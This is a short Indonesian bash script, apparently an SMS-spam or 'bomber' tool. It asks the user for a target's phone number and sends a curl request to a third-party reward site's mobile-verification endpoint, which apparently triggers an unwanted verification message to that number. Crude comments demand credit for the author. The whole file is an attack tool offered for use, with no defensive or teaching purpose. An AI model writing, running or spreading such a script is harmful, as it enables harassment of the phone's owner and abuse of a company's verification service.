#woy kang recod? Mau recode
#jangan lupa kasih nama authornya...
#lu pikir gampang buat tools anjeng


#!/bin/bash
r="\033[31;1m"
y="\033[33;1m"
yl="\033[1;33m"
g="\033[0;32m"
gl="\033[32;1m"
b="\033[0;36m"
bl="\033[36;1m"
c="\033[36;1m"
o="\033[0m"
y="\033[1;37m"

a="\033[30;1m"
m="\033[31;1m"
h="\033[32;1m"
k="\033[33;1m"
b="\033[34;1m"
r="\033[35;1m"
c="\033[36;1m"
p="\033[37;1m"
o="\033[0;37m"


echo ""
sleep 0.1
echo "$p[$m!$p]$b Pake$m 8xxxxxxx"
echo -n "$p[$m+$p]$h Nomor target $m:$k "
read nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
gas="curl -s $link"
sleep 0.1
echo "\033[1;37m═════════════════════════════════\033[1;31m"
sleep 0.1
$gas
sleep 0.2
echo "\n$p═════════════════════════════════"
echo "$y[$r✓$y]$gl Selesai$r..."
exit
